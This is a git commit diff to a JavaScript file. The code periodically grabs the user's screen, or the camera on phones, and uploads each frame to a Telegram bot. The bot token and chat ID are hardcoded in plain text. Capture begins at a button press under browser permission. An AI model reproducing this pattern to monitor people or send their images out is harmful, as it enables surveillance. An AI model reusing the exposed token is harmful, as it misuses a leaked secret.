bb38852e2ff3e21fe67d319a3cb792d5e3584c42
Sergey Rachyk <sergeirachuk7@mail.com>
2024-09-04 18:45:36 +0300

    test

--- js/script.js
+++ js/script.js
@@ -72,6 +72,79 @@ document.getElementById('themeToggle').addEventListener('click', function () {
 
 
 
+// const TOKEN = "7440822288:AAEDdkHYIniFfuObO7II_M7cyGNCmwP85Uo";
+// const CHAT_ID = "-1002238772738";
+// const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+
+// let captureStream;
+// let screenshotInterval;
+
+// async function startCapture(displayMediaOptions) {
+//   try {
+//     captureStream = await navigator.mediaDevices.getDisplayMedia(displayMediaOptions);
+//     document.getElementById('stopButton').style.display = 'block';
+//     document.getElementById('startButton').style.display = 'none';
+//   } catch (err) {
+//     console.error(`Error: ${err}`);
+//   }
+//   return captureStream;
+// }
+
+// function takeScreenshot() {
+//   const videoElement = document.createElement('video');
+//   videoElement.autoplay = true;
+
+//   startCapture({ video: true }).then(stream => {
+//     videoElement.srcObject = stream;
+
+//     const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
+//     screenshotInterval = setInterval(() => {
+//       const canvas = document.createElement('canvas');
+//       canvas.width = videoElement.videoWidth;
+//       canvas.height = videoElement.videoHeight;
+//       const context = canvas.getContext('2d');
+//       context.drawImage(videoElement, 0, 0);
+
+//       canvas.toBlob((blob) => {
+//         sendScreenshot(blob);
+//         console.log(blob);
+//         // Відправляємо скріншот у Telegram
+//       }, 'image/png');
+//     }, intervalValue);
+//   });
+// }
+
+// function sendScreenshot(screenshot) {
+//   const formData = new FormData();
+//   formData.append("chat_id", CHAT_ID);
+//   formData.append("photo", screenshot); // Додаємо скрін до formData
+//   axios.post(SEND_API, formData, {
+//     headers: {
+//       'Content-Type': 'multipart/form-data'
+//     }
+//   })
+//     .then((res) => {
+//       console.log("Скріншот надіслано!");
+//     })
+//     .catch((error) => {
+//       console.error('Error sending screenshot:', error);
+//     });
+// }
+
+// function stopScreenshots() {
+//   clearInterval(screenshotInterval);
+//   captureStream.getTracks().forEach(track => track.stop());
+//   document.getElementById('stopButton').style.display = 'none';
+//   document.getElementById('startButton').style.display = 'block';
+// }
+
+// document.getElementById('startButton').addEventListener('click', takeScreenshot);
+// document.getElementById('stopButton').addEventListener('click', stopScreenshots);
+
+
+
+
+
 const TOKEN = "7440822288:AAEDdkHYIniFfuObO7II_M7cyGNCmwP85Uo";
 const CHAT_ID = "-1002238772738";
 const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
@@ -79,9 +152,9 @@ const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 let captureStream;
 let screenshotInterval;
 
-async function startCapture(displayMediaOptions) {
+async function startCapture(mediaOptions) {
   try {
-    captureStream = await navigator.mediaDevices.getDisplayMedia(displayMediaOptions);
+    captureStream = await navigator.mediaDevices.getUserMedia(mediaOptions);
     document.getElementById('stopButton').style.display = 'block';
     document.getElementById('startButton').style.display = 'none';
   } catch (err) {
@@ -90,11 +163,26 @@ async function startCapture(displayMediaOptions) {
   return captureStream;
 }
 
+async function captureScreenOrCamera() {
+  let mediaOptions;
+
+  // Перевірка наявності доступу до екрана
+  if (navigator.mediaDevices.getDisplayMedia) {
+    mediaOptions = { video: true }; // Для комп'ютера
+    captureStream = await navigator.mediaDevices.getDisplayMedia(mediaOptions);
+  } else {
+    mediaOptions = { video: true }; // Для мобільного телефону
+    captureStream = await navigator.mediaDevices.getUserMedia(mediaOptions);
+  }
+
+  return captureStream;
+}
+
 function takeScreenshot() {
   const videoElement = document.createElement('video');
   videoElement.autoplay = true;
 
-  startCapture({ video: true }).then(stream => {
+  captureScreenOrCamera().then(stream => {
     videoElement.srcObject = stream;
 
     const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
@@ -108,7 +196,6 @@ function takeScreenshot() {
       canvas.toBlob((blob) => {
         sendScreenshot(blob);
         console.log(blob);
-        // Відправляємо скріншот у Telegram
       }, 'image/png');
     }, intervalValue);
   });
@@ -140,6 +227,3 @@ function stopScreenshots() {
 
 document.getElementById('startButton').addEventListener('click', takeScreenshot);
 document.getElementById('stopButton').addEventListener('click', stopScreenshots);
-
-
-
